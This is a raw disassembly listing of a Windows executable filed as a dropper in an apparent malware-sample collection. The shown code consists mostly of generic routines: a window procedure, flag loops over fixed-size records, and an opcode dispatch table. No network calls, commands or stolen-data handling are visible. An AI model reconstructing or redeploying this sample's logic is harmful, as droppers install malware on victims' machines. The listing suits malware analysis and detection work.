
malware_samples/dropper/0455ed6abd6758907267ba9e09155bc8b1f430e2b60a33c1e1aaebf92471a32e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 08 47 43 00    	mov    0x434708,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 5c 82 40 00    	call   *0x40825c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 10 47 43 00    	mov    0x434710,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 60 82 40 00    	call   *0x408260
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 64 82 40 00    	call   *0x408264
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 54 80 40 00    	mov    0x408054,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 58 80 40 00    	call   *0x408058
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 68 82 40 00    	call   *0x408268
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 5c 80 40 00    	call   *0x40805c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 60 80 40 00    	call   *0x408060
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 64 80 40 00    	call   *0x408064
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 50 80 40 00    	mov    0x408050,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 00 37 43 00       	push   $0x433700
  401155:	57                   	push   %edi
  401156:	ff 15 6c 82 40 00    	call   *0x40826c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 70 82 40 00    	call   *0x408270
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 28 47 43 00       	mov    0x434728,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 08 00 00    	imul   $0x818,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 08 00 00    	imul   $0x818,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 08 00 00       	add    $0x818,%eax
  4011e1:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  401201:	8b 1d 28 47 43 00    	mov    0x434728,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 2c 47 43 00    	cmp    0x43472c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 2c 47 43 00    	cmp    0x43472c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 28 47 43 00       	mov    0x434728,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 2c 47 43 00    	cmp    %esi,0x43472c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 08 00 00    	add    $0x818,%edx
  4012d5:	3b 35 2c 47 43 00    	cmp    0x43472c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 10 47 43 00       	mov    0x434710,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 2c 47 43 00    	mov    0x43472c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 28 47 43 00    	mov    0x434728,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 08 00 00    	add    $0x818,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401371:	85 c0                	test   %eax,%eax
  401373:	7d 11                	jge    0x401386
  401375:	40                   	inc    %eax
  401376:	b9 00 50 43 00       	mov    $0x435000,%ecx
  40137b:	c1 e0 0b             	shl    $0xb,%eax
  40137e:	2b c8                	sub    %eax,%ecx
  401380:	51                   	push   %ecx
  401381:	e8 8c 51 00 00       	call   0x406512
  401386:	c2 04 00             	ret    $0x4
  401389:	56                   	push   %esi
  40138a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40138e:	eb 6a                	jmp    0x4013fa
  401390:	8b c6                	mov    %esi,%eax
  401392:	8b 0d 30 47 43 00    	mov    0x434730,%ecx
  401398:	6b c0 1c             	imul   $0x1c,%eax,%eax
  40139b:	03 c1                	add    %ecx,%eax
  40139d:	83 38 01             	cmpl   $0x1,(%eax)
  4013a0:	74 5c                	je     0x4013fe
  4013a2:	50                   	push   %eax
  4013a3:	e8 8c 00 00 00       	call   0x401434
  4013a8:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013ad:	74 55                	je     0x401404
  4013af:	50                   	push   %eax
  4013b0:	e8 b8 ff ff ff       	call   0x40136d
  4013b5:	85 c0                	test   %eax,%eax
  4013b7:	75 04                	jne    0x4013bd
  4013b9:	40                   	inc    %eax
  4013ba:	46                   	inc    %esi
  4013bb:	eb 07                	jmp    0x4013c4
  4013bd:	48                   	dec    %eax
  4013be:	8b ce                	mov    %esi,%ecx
  4013c0:	8b f0                	mov    %eax,%esi
  4013c2:	2b c1                	sub    %ecx,%eax
  4013c4:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c9:	74 2f                	je     0x4013fa
  4013cb:	01 05 ec 36 43 00    	add    %eax,0x4336ec
  4013d1:	6a 00                	push   $0x0
  4013d3:	ff 35 d4 36 43 00    	push   0x4336d4
  4013d9:	68 30 75 00 00       	push   $0x7530
  4013de:	ff 35 ec 36 43 00    	push   0x4336ec
  4013e4:	ff 15 48 81 40 00    	call   *0x408148
  4013ea:	50                   	push   %eax
  4013eb:	68 02 04 00 00       	push   $0x402
  4013f0:	ff 74 24 18          	push   0x18(%esp)
  4013f4:	ff 15 58 82 40 00    	call   *0x408258
  4013fa:	85 f6                	test   %esi,%esi
  4013fc:	7d 92                	jge    0x401390
  4013fe:	33 c0                	xor    %eax,%eax
  401400:	5e                   	pop    %esi
  401401:	c2 08 00             	ret    $0x8
  401404:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  401409:	eb f5                	jmp    0x401400
  40140b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40140f:	8b 0d 10 47 43 00    	mov    0x434710,%ecx
  401415:	6a 00                	push   $0x0
  401417:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40141b:	e8 69 ff ff ff       	call   0x401389
  401420:	c2 04 00             	ret    $0x4
  401423:	68 f0 ad 40 00       	push   $0x40adf0
  401428:	ff 74 24 08          	push   0x8(%esp)
  40142c:	e8 06 42 00 00       	call   0x405637
  401431:	c2 04 00             	ret    $0x4
  401434:	55                   	push   %ebp
  401435:	8b ec                	mov    %esp,%ebp
  401437:	81 ec dc 02 00 00    	sub    $0x2dc,%esp
  40143d:	53                   	push   %ebx
  40143e:	56                   	push   %esi
  40143f:	8b 75 08             	mov    0x8(%ebp),%esi
  401442:	57                   	push   %edi
  401443:	a1 08 47 43 00       	mov    0x434708,%eax
  401448:	6a 07                	push   $0x7
  40144a:	59                   	pop    %ecx
  40144b:	8d 7d cc             	lea    -0x34(%ebp),%edi
  40144e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401450:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  401453:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401456:	be 00 50 43 00       	mov    $0x435000,%esi
  40145b:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40145e:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401461:	33 db                	xor    %ebx,%ebx
  401463:	c1 e1 0b             	shl    $0xb,%ecx
  401466:	03 ce                	add    %esi,%ecx
  401468:	8b f8                	mov    %eax,%edi
  40146a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40146d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  401470:	c1 e7 0b             	shl    $0xb,%edi
  401473:	89 0d 4c ce 40 00    	mov    %ecx,0x40ce4c
  401479:	8d 4a fe             	lea    -0x2(%edx),%ecx
  40147c:	03 fe                	add    %esi,%edi
  40147e:	83 f9 43             	cmp    $0x43,%ecx
  401481:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401484:	0f 87 cc 17 00 00    	ja     0x402c56
  40148a:	ff 24 8d 68 2c 40 00 	jmp    *0x402c68(,%ecx,4)
  401491:	53                   	push   %ebx
  401492:	50                   	push   %eax
  401493:	e8 9f 41 00 00       	call   0x405637
  401498:	e9 2c 0f 00 00       	jmp    0x4023c9
  40149d:	ff 05 cc 36 43 00    	incl   0x4336cc
  4014a3:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a6:	0f 84 1d 0f 00 00    	je     0x4023c9
  4014ac:	53                   	push   %ebx
  4014ad:	ff 15 20 82 40 00    	call   *0x408220
  4014b3:	e9 11 0f 00 00       	jmp    0x4023c9
  4014b8:	50                   	push   %eax
  4014b9:	e8 af fe ff ff       	call   0x40136d
  4014be:	48                   	dec    %eax
  4014bf:	53                   	push   %ebx
  4014c0:	50                   	push   %eax
  4014c1:	e8 c3 fe ff ff       	call   0x401389
  4014c6:	e9 96 17 00 00       	jmp    0x402c61
  4014cb:	53                   	push   %ebx
  4014cc:	50                   	push   %eax
  4014cd:	e8 65 41 00 00       	call   0x405637
  4014d2:	e9 7f 17 00 00       	jmp    0x402c56
  4014d7:	53                   	push   %ebx
  4014d8:	e8 d3 18 00 00       	call   0x402db0
  4014dd:	83 f8 01             	cmp    $0x1,%eax
  4014e0:	59                   	pop    %ecx
  4014e1:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014e4:	7f 03                	jg     0x4014e9
  4014e6:	33 c0                	xor    %eax,%eax
  4014e8:	40                   	inc    %eax
  4014e9:	50                   	push   %eax
  4014ea:	ff 15 d4 80 40 00    	call   *0x4080d4
  4014f0:	e9 61 17 00 00       	jmp    0x402c56
  4014f5:	ff 75 f8             	push   -0x8(%ebp)
  4014f8:	ff 15 24 82 40 00    	call   *0x408224
  4014fe:	e9 53 17 00 00       	jmp    0x402c56
  401503:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401506:	7f 39                	jg     0x401541
  401508:	7d 0e                	jge    0x401518
  40150a:	8b 04 85 80 47 43 00 	mov    0x434780(,%eax,4),%eax
  401511:	a3 54 ce 40 00       	mov    %eax,0x40ce54
  401516:	eb 0f                	jmp    0x401527
  401518:	c1 e0 02             	shl    $0x2,%eax
  40151b:	8b 88 80 47 43 00    	mov    0x434780(%eax),%ecx
  401521:	89 88 e0 47 43 00    	mov    %ecx,0x4347e0(%eax)
  401527:	6a 01                	push   $0x1
  401529:	e8 82 18 00 00       	call   0x402db0
  40152e:	59                   	pop    %ecx
  40152f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  401532:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401535:	89 04 8d 80 47 43 00 	mov    %eax,0x434780(,%ecx,4)
  40153c:	e9 15 17 00 00       	jmp    0x402c56
  401541:	c1 e0 02             	shl    $0x2,%eax
  401544:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  401547:	8d 88 80 47 43 00    	lea    0x434780(%eax),%ecx
  40154d:	8b 80 e0 47 43 00    	mov    0x4347e0(%eax),%eax
  401553:	89 01                	mov    %eax,(%ecx)
  401555:	0f 8d fb 16 00 00    	jge    0x402c56
  40155b:	a1 54 ce 40 00       	mov    0x40ce54,%eax
  401560:	89 01                	mov    %eax,(%ecx)
  401562:	e9 ef 16 00 00       	jmp    0x402c56
  401567:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40156a:	8d 34 85 80 47 43 00 	lea    0x434780(,%eax,4),%esi
  401571:	33 c0                	xor    %eax,%eax
  401573:	8b 0e                	mov    (%esi),%ecx
  401575:	3b cb                	cmp    %ebx,%ecx
  401577:	0f 94 c0             	sete   %al
  40157a:	23 4d dc             	and    -0x24(%ebp),%ecx
  40157d:	8b 44 85 d0          	mov    -0x30(%ebp,%eax,4),%eax
  401581:	89 0e                	mov    %ecx,(%esi)
  401583:	e9 d9 16 00 00       	jmp    0x402c61
  401588:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40158b:	ff 34 85 80 47 43 00 	push   0x434780(,%eax,4)
  401592:	57                   	push   %edi
  401593:	e9 38 16 00 00       	jmp    0x402bd0
  401598:	8b 0d d0 36 43 00    	mov    0x4336d0,%ecx
  40159e:	8b 35 28 82 40 00    	mov    0x408228,%esi
  4015a4:	3b cb                	cmp    %ebx,%ecx
  4015a6:	74 09                	je     0x4015b1
  4015a8:	ff 75 d4             	push   -0x2c(%ebp)
  4015ab:	51                   	push   %ecx
  4015ac:	ff d6                	call   *%esi
  4015ae:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4015b1:	8b 0d e4 36 43 00    	mov    0x4336e4,%ecx
  4015b7:	3b cb                	cmp    %ebx,%ecx
  4015b9:	0f 84 97 16 00 00    	je     0x402c56
  4015bf:	50                   	push   %eax
  4015c0:	51                   	push   %ecx
  4015c1:	ff d6                	call   *%esi
  4015c3:	e9 8e 16 00 00       	jmp    0x402c56
  4015c8:	6a f0                	push   $0xfffffff0
  4015ca:	e8 03 18 00 00       	call   0x402dd2
  4015cf:	ff 75 d4             	push   -0x2c(%ebp)
  4015d2:	50                   	push   %eax
  4015d3:	ff 15 d8 80 40 00    	call   *0x4080d8
  4015d9:	85 c0                	test   %eax,%eax
  4015db:	0f 85 75 16 00 00    	jne    0x402c56
  4015e1:	e9 74 13 00 00       	jmp    0x40295a
  4015e6:	6a f0                	push   $0xfffffff0
  4015e8:	e8 e5 17 00 00       	call   0x402dd2
  4015ed:	50                   	push   %eax
  4015ee:	89 45 08             	mov    %eax,0x8(%ebp)
  4015f1:	e8 36 49 00 00       	call   0x405f2c
  4015f6:	8b f0                	mov    %eax,%esi
  4015f8:	3b f3                	cmp    %ebx,%esi
  4015fa:	74 61                	je     0x40165d
  4015fc:	6a 5c                	push   $0x5c
  4015fe:	56                   	push   %esi
  4015ff:	e8 aa 48 00 00       	call   0x405eae
  401604:	8b f0                	mov    %eax,%esi
  401606:	66 8b 3e             	mov    (%esi),%di
  401609:	66 89 1e             	mov    %bx,(%esi)
  40160c:	66 3b fb             	cmp    %bx,%di
  40160f:	75 1f                	jne    0x401630
  401611:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  401614:	74 1a                	je     0x401630
  401616:	e8 62 45 00 00       	call   0x405b7d
  40161b:	85 c0                	test   %eax,%eax
  40161d:	74 11                	je     0x401630
  40161f:	ff 75 08             	push   0x8(%ebp)
  401622:	e8 df 44 00 00       	call   0x405b06
  401627:	3b c3                	cmp    %ebx,%eax
  401629:	74 28                	je     0x401653
  40162b:	ff 45 fc             	incl   -0x4(%ebp)
  40162e:	eb 08                	jmp    0x401638
  401630:	ff 75 08             	push   0x8(%ebp)
  401633:	e8 28 45 00 00       	call   0x405b60
  401638:	3b c3                	cmp    %ebx,%eax
  40163a:	74 17                	je     0x401653
  40163c:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401641:	75 0d                	jne    0x401650
  401643:	ff 75 08             	push   0x8(%ebp)
  401646:	ff 15 dc 80 40 00    	call   *0x4080dc
  40164c:	a8 10                	test   $0x10,%al
  40164e:	75 03                	jne    0x401653
  401650:	ff 45 fc             	incl   -0x4(%ebp)
  401653:	66 89 3e             	mov    %di,(%esi)
  401656:	46                   	inc    %esi
  401657:	46                   	inc    %esi
  401658:	66 3b fb             	cmp    %bx,%di
  40165b:	75 9f                	jne    0x4015fc
  40165d:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  401660:	74 2d                	je     0x40168f
  401662:	6a e6                	push   $0xffffffe6
  401664:	e8 ba fd ff ff       	call   0x401423
  401669:	ff 75 08             	push   0x8(%ebp)
  40166c:	68 00 00 44 00       	push   $0x440000
  401671:	e8 3c 4f 00 00       	call   0x4065b2
  401676:	ff 75 08             	push   0x8(%ebp)
  401679:	ff 15 e0 80 40 00    	call   *0x4080e0
  40167f:	85 c0                	test   %eax,%eax
  401681:	0f 85 cf 15 00 00    	jne    0x402c56
  401687:	ff 45 fc             	incl   -0x4(%ebp)
  40168a:	e9 c7 15 00 00       	jmp    0x402c56
  40168f:	6a f5                	push   $0xfffffff5
  401691:	e9 87 0c 00 00       	jmp    0x40231d
  401696:	53                   	push   %ebx
  401697:	e8 36 17 00 00       	call   0x402dd2
  40169c:	50                   	push   %eax
  40169d:	e8 6d 52 00 00       	call   0x40690f
  4016a2:	e9 ad 06 00 00       	jmp    0x401d54
  4016a7:	6a d0                	push   $0xffffffd0
  4016a9:	e8 24 17 00 00       	call   0x402dd2
  4016ae:	6a df                	push   $0xffffffdf
  4016b0:	8b f0                	mov    %eax,%esi
  4016b2:	e8 1b 17 00 00       	call   0x402dd2
  4016b7:	6a 13                	push   $0x13
  4016b9:	8b f8                	mov    %eax,%edi
  4016bb:	e8 12 17 00 00       	call   0x402dd2
  4016c0:	57                   	push   %edi
  4016c1:	56                   	push   %esi
  4016c2:	ff 15 e4 80 40 00    	call   *0x4080e4
  4016c8:	85 c0                	test   %eax,%eax
  4016ca:	74 07                	je     0x4016d3
  4016cc:	6a e3                	push   $0xffffffe3
  4016ce:	e9 4a 0c 00 00       	jmp    0x40231d
  4016d3:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
